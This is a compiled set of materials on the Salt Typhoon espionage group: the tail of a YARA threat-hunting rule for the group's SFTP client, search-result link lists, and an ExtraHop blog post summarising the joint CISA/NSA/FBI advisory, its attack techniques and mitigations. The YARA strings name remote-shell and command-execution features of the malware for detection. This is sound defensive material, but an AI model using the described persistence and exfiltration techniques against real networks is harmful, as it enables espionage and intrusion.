        or (uint32(0) == 0xcffaedfe))) 
        and 5 of them

}

Table 6: new2 SFTP client
File Name  new2
SHA 256 Hash da692ea0b7f24e31696f8b4fe8a130dbbe3c7c15cea6bde24cccc1fb0a73ae9e
File Type  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped
New2 SFTP client Yara rule

rule SALT_TYPHOON_NEW2_SFTP_CLIENT {

meta:

description = "Detects the Salt Typhoon New2 SFTP client. Rule is meant for threat hunting."

strings:

$set_1_1 = "invoke_shell"

$set_1_2 = "execute_commands"

$set_1_3 = "cmd_file"

$set_1_4 = "stop_event"

$set_1_5 = "decrypt_message"

$set_2_1 = "COMMANDS_FILE"

$set_2_2 = "RUN_TIME"

$set_2_3 = "LOG_FILE"

$set_2_4 = "ENCRYPTION_PASSWORD"

$set_2_5 = "FIREWALL_ADDRESS"

$set_3_1 = "commands.log"

$set_3_2 = "Executing command: {}"

$set_3_3 = "Connecting to: {}"

*[Truncated: this section shows the first 39,970 of 70,219 characters — the cut lands at the last clean paragraph or word boundary; the full source text remains in the run report JSON beside the guide.]*



|  |  |
| --- | --- |
|  |  |
|  |  |
|  |  |



- [About](https://failsearx.culturanerd.it/info/en/about)
- [Preferences](https://failsearx.culturanerd.it/preferences)
- [SearXNG](https://failsearx.culturanerd.it/)
- [duckduckgo](https://failsearx.culturanerd.it/stats?engine=duckduckgo)
- [wikidata](https://failsearx.culturanerd.it/stats?engine=wikidata)
- [startpage](https://failsearx.culturanerd.it/stats?engine=startpage)
- [wikipedia](https://failsearx.culturanerd.it/stats?engine=wikipedia)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa25-239a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [Countering Chinese State-Sponsored Actors Compromise of Networks ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [https://www.fbi.gov
› video-repository › salttyphoon082725.mp4 › view](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [FBI Announces Joint Cybersecurity Advisory Related to Salt Typhoon](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [cached](https://web.archive.org/web/https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [https://www.extrahop.com
› blog › anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [Anatomy of an Attack: CISA Alert on Salt Typhoon - ExtraHop](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [cached](https://web.archive.org/web/https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa24-038a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [PRC State-Sponsored Actors Compromise and Maintain Persistent ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [https://www.cisa.gov
› topics › cyber-threats-and-advisories › nation-state-cyber-actors › china](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [China Threat Overview and Advisories - CISA](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [cached](https://web.archive.org/web/https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [https://en.wikipedia.org
› wiki › Salt_Typhoon](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [Salt Typhoon - Wikipedia](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [cached](https://web.archive.org/web/https://en.wikipedia.org/wiki/Salt_Typhoon)
- [https://cert.gov.ng
› advisories › salt-typhoon-apt-group-cyber-espionage-campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [Salt Typhoon Apt Group Cyber Espionage Campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [cached](https://web.archive.org/web/https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.pdf](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [Countering Chinese State-Sponsored Actors Compromise of ... - BSI](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [https://www.ic3.gov
› CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [https://deepstrike.io
› blog › salt-typhoon](https://deepstrike.io/blog/salt-typhoon)
- [Salt Typhoon: Inside China's Telecom Espionage Campaign](https://deepstrike.io/blog/salt-typhoon)
- [cached](https://web.archive.org/web/https://deepstrike.io/blog/salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › Article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State-Sponsored Actors ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.ashurstperkinscoie.com
› en › insights › salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [Salt Typhoon Cyberattacks: Updated Threat Assessment and ...](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [cached](https://web.archive.org/web/https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [https://globalcyberalliance.org
› new-report-salt-typhoon-across-the-internet](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [New Report: Salt Typhoon Across the Internet - GCA](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [cached](https://web.archive.org/web/https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [https://www.congress.gov
› crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [https://eclypsium.com
› blog › cisa-fbi-salt-typhoon-guidance](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [New Salt Typhoon Defense Guidance from FBI and CISA - Eclypsium](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [cached](https://web.archive.org/web/https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.html](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [Joint Cybersecurity advisory (CSA) about SALT TYPHOON](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [https://failsearx.culturanerd.it/search#](https://failsearx.culturanerd.it/search#)
- [SearXNG](https://failsearx.culturanerd.it/info/en/about)
- [Source code](https://github.com/searxng/searxng)
- [Issue tracker](https://github.com/searxng/searxng/issues)
- [Engine stats](https://failsearx.culturanerd.it/stats)
- [Public instances](https://searx.space/)



- [https://www.ic3.gov › CSA › 2025 › 250827.pdf  ](https://www.ic3.gov/CSA/2025/250827.pdf)



- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)



- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)



- [https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf  ](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



### Anatomy of an Attack: CISA Alert on Salt Typhoon - ExtraHop


ExtraHop® Closes Enterprise Data Center Blind Spots with new 400 Gbps sensor

Reduce Breach Risk

Decrypt the traffic others miss, reveal hidden attack surfaces, and stop intrusions before impact.

See the Entire Attack Surface

Respond at Machine Speed

Arm SOC and NOC agents with structured, real-time ground truth to investigate and act decisively, in seconds.

Power the Agentic SOC
Operationalize the Agentic NOC

Accelerate AI Adoption

Expose shadow AI, infrastructure strain, and runaway costs the moment they hit the network.

Monitor AI Usage & Behavior
Optimize AI Performance & Resilience

Solutions by Industry

Investigate smarter and stop threats faster—ExtraHop helps enterprise organizations across every industry.

CUSTOMER STORY

Home Depot and RevealX™ Build a Better Customer Experience

How do you provide a seamless customer experience across the company's online and physical operations?

ExtraHop Achieves FedRAMP® Authorization

The modern NDR platform built for federal agencies

ExtraHop RevealX Platform

Consolidate your NDR, NPM, and IDS tools into a single platform that delivers a holistic view of all network activity

From streamlined analytics to response automation, together, we help you thrive.

Agentic SOC Alliance

Industry coalition defining the open operating model for autonomous security operations.

REPORT

Gartner® Magic Quadrant™ 2026

See why ExtraHop is a leader in the 2026 Gartner® Magic Quadrant™ for Network Detection & Response

REPORT

Gartner® Magic Quadrant™ 2026

EBOOK

The Agentic SOC Blueprint

High-fidelity telemetry for autonomous decision-making.

Company

About ExtraHop
Leadership

Media

Company News

Partners

Machine-Speed Threats. Machine-Speed Defense. Now at 400 Gbps

ExtraHop® Closes Enterprise Data Center Blind Spots with the First NDR Platform to Run at 400 Gbps

Get a Demo

CISA Alert on Salt Typhoon

AUGUST 29, 2025

Anatomy of an Attack
CISA Alert on Salt Typhoon
Protecting Your Organization from Persistent Cyber Espionage
A Joint Warning on a Pervasive Threat

On August 27, 2025, the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) issued a critical joint advisory [1] shining a spotlight on "Salt Typhoon," a sophisticated state-sponsored advanced persistent threat (APT) actor affiliated with the People's Republic of China (PRC), whose ongoing cyber espionage campaign poses a significant threat to critical infrastructure sectors globally.

Who is Salt Typhoon?

Salt Typhoon is not a new player in the cyber threat landscape. Active since at least 2019, the PRC state-sponsored group is primarily focused on long-term cyber espionage, meticulously gathering intelligence rather than seeking immediate financial gain [2]. Their operations are extensive, designed to establish persistent access to target networks and exfiltrate sensitive data. These activities represent a clear breach of global telecommunications privacy and security norms, aiming to compromise organizations crucial to national and economic security.

The Scope of the Attacks

The advisory highlights that Salt Typhoon's targeting is deliberate and strategic, focusing on sectors that provide essential services and hold significant value for a long-term espionage campaign.

Targeted Sectors

Salt Typhoon has primarily targeted critical infrastructure sectors across the globe.

Telecommunications: By gaining deep access to telecommunications networks, Salt Typhoon can conduct pervasive surveillance, intercepting communications on a massive scale. This provides invaluable intelligence on a broad range of targets, including government agencies, businesses, and private citizens, without having to individually compromise each target.

Government: The targeting of government entities goes beyond simple data theft. By infiltrating government networks, Salt Typhoon can collect sensitive policy documents, operational data, and strategic plans, all of which provide a clear picture of a nation's intentions and capabilities. This information is invaluable for diplomatic, economic, and military intelligence gathering.

Transportation: Infiltrating transportation networks, including those for air, sea, and land travel, provides a significant strategic advantage. A threat actor can not only monitor logistics and supply chains but also potentially track the movement of key personnel or military assets. In a crisis scenario, such access could be used to cause economic disruption or impede a military response.

Lodging: This sector is often used as a gateway to target high-value individuals. Salt Typhoon has targeted networks at hotels and other lodging establishments to gain access to the devices of visiting government officials, corporate executives, and military personnel. These networks are often less secure than corporate or government networks, making them an ideal initial entry point for an attack on a high-value target.

Military Networks: Direct intelligence gathering from military networks is a core goal of any state-sponsored espionage group. Access to these systems can provide critical insights into defense capabilities, military doctrine, research and development projects, and operational readiness. This information can be used to inform strategic decisions or to prepare for potential future conflicts [3].

Salt Typhoon’s Tactics, Techniques, and Procedures (TTPs)

Salt Typhoon's operational playbook is characterized by stealth, persistence, and an adept use of both well-known vulnerabilities and sophisticated evasion techniques. Their methods demonstrate a clear intent to establish long-term access rather than short-term disruption.

Initial Access (MITRE ATT&CK: T1190): The group frequently exploits public-facing applications to gain a foothold [4]. They target known, unpatched vulnerabilities in internet-facing network edge devices, such as routers, firewalls, and VPN appliances. The advisory notes that the group has had considerable success using this method, underscoring the critical importance of diligent patch management.

Persistence (MITRE ATT&CK: T1098.004, T1021.004, T1571): Once inside, they establish persistence by adding SSH authorized keys to devices for continued remote access. They utilize a well known technique known as non-standard port usage by enabling SSH on ports other than the default. They are adept at clearing logs and disabling security features to cover their tracks [5].

Lateral Movement (MITRE ATT&CK: T1078.003): Salt Typhoon leverages compromised credentials to move deeper into the network using valid accounts [6]. They abuse legitimate protocols and routing infrastructure to traverse devices, seeking out high-value data and additional systems to control.

Command and Control (C2) (MITRE ATT&CK: T1071.001, T1572): For C2 communications, Salt Typhoon often uses application layer protocols like web protocols over encrypted channels and legitimate web services to blend in with normal network traffic. They have also been observed using protocol tunneling via GRE/IPsec to create a stealthy C2 channel.

Data Exfiltration (MITRE ATT&CK: T1041, T1048): Their primary goal is intelligence gathering, so data exfiltration focuses on sensitive communications and proprietary information [7]. This is often accomplished by using the established C2 channel (exfiltration over C2 channel) or by using alternative protocols (exfiltration over alternative protocol) to move data out of the compromised network.

Joint Guidance and Mitigation Measures for Salt Typhoon

The joint advisory provides a crucial and actionable defense blueprint for organizations to fortify their security posture against the persistent threat of Salt Typhoon. Implementing these measures is not just recommended; it is critical to preventing, detecting, and mitigating a compromise.

Patch Management: Diligently identifying and immediately patching all internet-facing devices is the single most critical step. Salt Typhoon's preferred initial access method involves exploiting known, unpatched vulnerabilities on routers, firewalls, and VPN appliances. By maintaining a strict and timely patching schedule, organizations can directly shut down one of the primary entry points used by the threat actors.

Configuration Monitoring: Organizations must regularly audit and monitor the configurations of all network devices for unauthorized or suspicious changes. Salt Typhoon frequently modifies device configurations to establish persistence and create backdoors, often enabling services like SSH and FTP on unusual ports. Proactive monitoring can help security teams spot these unauthorized changes before the adversary can fully entrench themselves in the network.

Network Monitoring: Proactively hunting for anomalous network traffic patterns is a key defensive tactic. Since Salt Typhoon often uses non-standard ports for services like SSH to evade basic firewall rules and security tools, a robust network monitoring solution is essential for detecting this unusual activity. This vigilance can uncover the tell-tale signs of an ongoing compromise that would otherwise go unnoticed.

Log Analysis: Implementing a robust and centralized log management system is vital. Salt Typhoon is known to tamper with or clear logs to hide its activity and maintain a low profile within a compromised network. By capturing and analyzing logs in real-time and storing them securely on a separate system, security teams can preserve a forensic record of malicious activity even if the attackers attempt to erase their tracks.

Strong Authentication: Enforcing strong, unique passwords across all systems and implementing multi-factor authentication (MFA) everywhere possible, particularly for all remote access points, is a foundational security measure. Salt Typhoon relies on compromised credentials, often obtained via password spraying or phishing, to facilitate lateral movement and escalate privileges. MFA directly mitigates this threat by making it exponentially harder for attackers to use stolen credentials.

Secure Remote Access: All remote access solutions, including VPNs and remote desktop services, must have strict controls and continuous monitoring. These services are a prime target for initial access. By securing these gateways with strong authentication, monitoring for anomalous connection attempts, and logging all activity, organizations can significantly reduce their external attack surface.

Network Segmentation: Properly segmenting the network into smaller, isolated zones is a highly effective way to limit the potential impact of a breach. Even if Salt Typhoon successfully compromises one part of the network, segmentation restricts their ability to move laterally to other sensitive systems and data, containing the attack and preventing a full-scale compromise.

How Network Detection and Response (NDR) Combats Salt Typhoon

"Salt Typhoon exploits known vulnerabilities in edge routers and network devices, then modifies configurations and opens ports to establish persistent access. Traditional security tools miss these changes, especially when they themselves are used in the attack. That’s where protocol-aware NDR with full network visibility becomes critical for catching these unexpected configuration changes and unusual traffic patterns, such as SSH spun up on high ports and GRE/IPsec tunnels that don’t belong, indicating that your own security devices have been turned against you."

Henry Peltokangas, Director, Reveal Labs, ExtraHop

While essential, traditional security tools like firewalls, antivirus, endpoint detection and response (EDR), and SIEMs may not be enough to counter the stealth and persistence of a sophisticated APT like Salt Typhoon. This is where the ExtraHop RevealX Network Detection and Response (NDR) platform can provide a critical advantage.

Continuous Network Visibility: ExtraHop passively monitors all network traffic, including encrypted communications, providing a complete, real-time picture of activity across the entire attack surface. ExtraHop directly counters the tactics of Salt Typhoon by providing comprehensive network visibility, monitoring all network traffic, including encrypted communications, and fully decrypting and decodes 90+ protocols. This unique visibility ensures security teams can see malicious activity hidden within encrypted traffic that evades detection from other NDR tools, like reconnaissance, lateral movement, use of compromised credentials, and data exfiltration attempts.

Targeted Detection of Salt Typhoon's TTPs:

Lateral Movement: ExtraHop's machine learning models excel at detecting anomalous internal behaviors. It can detect subtle deviations like unusual authentication patterns, abnormal protocol usage, and suspicious lateral movement, even when legitimate credentials are used. Your security team can pull built-in and custom metrics into a dashboard to visualize these minute deviations from the baseline, which is critical for identifying and investigating even the smallest threats.
Persistence and Evasion: ExtraHop can precisely identify services running on non-standard ports, a key evasion tactic of Salt Typhoon. For example, if SSH or FTP traffic is observed on an unusual port, ExtraHop immediately flags it as a critical alert.
Command and Control: By analyzing network flows and behavioral anomalies, ExtraHop can detect suspicious outbound connections that indicate C2 activity, even when using encrypted tunnels or legitimate web services.
Data Exfiltration: ExtraHop provides deep visibility into data transfers, detecting unusually large data egress, transfers to suspicious external destinations, or the use of non-standard protocols for data exfiltration.

Automated Response & Integration: ExtraHop integrates seamlessly with other security tools like SIEM and SOAR platforms, enriching alerts with high-fidelity network context. This allows security teams to automate responses, validate alerts quickly, and respond with greater speed and confidence, reducing the Salt Typhoon's dwell time.

Threat Hunting & Forensics: With continuous network recording and advanced analytics, ExtraHop provides the comprehensive data needed for deep forensic investigation. Security teams can trace an attacker's entire path, understand the full scope of a compromise, and determine precisely what data was accessed or exfiltrated. With high-fidelity network forensics to measure the scope of impact and conduct forensic analysis, ExtraHop converts the source of truth found within network data into actionable insights. This allows security teams to conduct a detailed forensic analysis to see exactly how Salt Typhoon moved, what systems were accessed, and what data was compromised, enabling a more rapid response.

The Ongoing Effort to Protect Critical Infrastructure

The CISA, NSA, and FBI joint advisory on Salt Typhoon serves as an important reminder of the persistent and evolving nature of state-sponsored cyber espionage. Protecting critical infrastructure requires a multi-layered defense strategy, with robust cyber hygiene as the foundation and advanced detection capabilities as a vital component. By understanding Salt Typhoon's TTPs and leveraging solutions like the ExtraHop RevealX Network Detection and Response (NDR) platform, organizations can significantly enhance their ability to detect, investigate, and respond to these sophisticated threats, safeguarding their operations and the critical services they provide.

Endnotes:

[1] CISA. (August 27, 2025). CISA and Partners Release Joint Advisory: Countering Chinese State-Sponsored Actors’ Compromise. https://www.cisa.gov/news-events/news/cisa-and-partners-release-joint-advisory-countering-chinese-state-sponsored-actors-compromise

[2] CISA. (August 27, 2025). Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System. https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a

[3] NSA. (August 27, 2025). NSA and Others Provide Guidance to Counter China State-Sponsored Actors Targeting Critical Infrastructure. https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/

[4] CISA. (August 27, 2025). Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System. https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a (Specifics on exploiting known vulnerabilities)

[5] CISA. (August 27, 2025). Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System. https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a (Details on persistence techniques like non-standard ports, log clearing)

[6] FBI. (August 27, 2025). Salt Typhoon Briefing. https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view (Information on lateral movement and credential abuse)

[7] CISA. (August 27, 2025). Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System. https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a (Details on data collection focus for intelligence gathering)

Discover more

Anatomy of an Attack
Patrick Bedwell

Head of Product Marketing & Technical Marketing

Patrick Bedwell is an accomplished product marketing leader with deep expertise in the cybersecurity sector. He has a proven track record of leading high-performing teams at companies like Fortinet and Lastline. He holds an MBA from Santa Clara University.

SHARE
Key Takeaways
Salt Typhoon is a PRC state-sponsored APT active since at least 2019, focused on long-term espionage across telecommunications, government, transportation, lodging, and military networks globally.
The group exploits known, unpatched vulnerabilities in internet-facing edge devices like routers, firewalls, and VPN appliances as its preferred initial access method.
Salt Typhoon establishes persistence by adding SSH authorized keys, enabling SSH on non-standard ports, and clearing logs to cover its tracks inside compromised networks.
For C2 communications, Salt Typhoon uses encrypted web protocols and legitimate web services to blend in with normal network traffic, making detection exceptionally difficult.
Lodging networks are targeted as low-security entry points to compromise the devices of visiting government officials, executives, and military personnel.
CISA, NSA, and FBI issued a joint advisory on August 27, 2025, calling for immediate patching, configuration monitoring, network segmentation, MFA enforcement, and robust log management.
ExtraHop detects Salt Typhoon's evasion tactics by identifying services running on non-standard ports, anomalous authentication patterns, suspicious outbound C2 connections, and unusual data egress.
Experience RevealX NDR for Yourself
Schedule a demo
BACK TO THE TOP
Products

Network Detection and Response

RevealX™ NDR

Network Performance Monitoring

RevealX™ NPM

RevealX™ Platform

Company

Leadership

Blog

Newsroom

Trust Center

Privacy Notice

Do Not Sell My Personal Information

Vulnerability Disclosure

By clicking “I Understand”, you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts.
I Understand
Your Preferences



|  |  |
| --- | --- |
|  |  |
|  |  |
|  |  |



- [About](https://failsearx.culturanerd.it/info/en/about)
- [Preferences](https://failsearx.culturanerd.it/preferences)
- [SearXNG](https://failsearx.culturanerd.it/)
- [duckduckgo](https://failsearx.culturanerd.it/stats?engine=duckduckgo)
- [wikidata](https://failsearx.culturanerd.it/stats?engine=wikidata)
- [startpage](https://failsearx.culturanerd.it/stats?engine=startpage)
- [wikipedia](https://failsearx.culturanerd.it/stats?engine=wikipedia)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa25-239a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [Countering Chinese State-Sponsored Actors Compromise of Networks ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [https://www.fbi.gov
› video-repository › salttyphoon082725.mp4 › view](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [FBI Announces Joint Cybersecurity Advisory Related to Salt Typhoon](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [cached](https://web.archive.org/web/https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [https://www.extrahop.com
› blog › anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [Anatomy of an Attack: CISA Alert on Salt Typhoon - ExtraHop](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [cached](https://web.archive.org/web/https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa24-038a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [PRC State-Sponsored Actors Compromise and Maintain Persistent ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [https://www.cisa.gov
› topics › cyber-threats-and-advisories › nation-state-cyber-actors › china](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [China Threat Overview and Advisories - CISA](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [cached](https://web.archive.org/web/https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [https://en.wikipedia.org
› wiki › Salt_Typhoon](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [Salt Typhoon - Wikipedia](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [cached](https://web.archive.org/web/https://en.wikipedia.org/wiki/Salt_Typhoon)
- [https://cert.gov.ng
› advisories › salt-typhoon-apt-group-cyber-espionage-campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [Salt Typhoon Apt Group Cyber Espionage Campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [cached](https://web.archive.org/web/https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.pdf](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [Countering Chinese State-Sponsored Actors Compromise of ... - BSI](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [https://www.ic3.gov
› CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [https://deepstrike.io
› blog › salt-typhoon](https://deepstrike.io/blog/salt-typhoon)
- [Salt Typhoon: Inside China's Telecom Espionage Campaign](https://deepstrike.io/blog/salt-typhoon)
- [cached](https://web.archive.org/web/https://deepstrike.io/blog/salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › Article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State-Sponsored Actors ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.ashurstperkinscoie.com
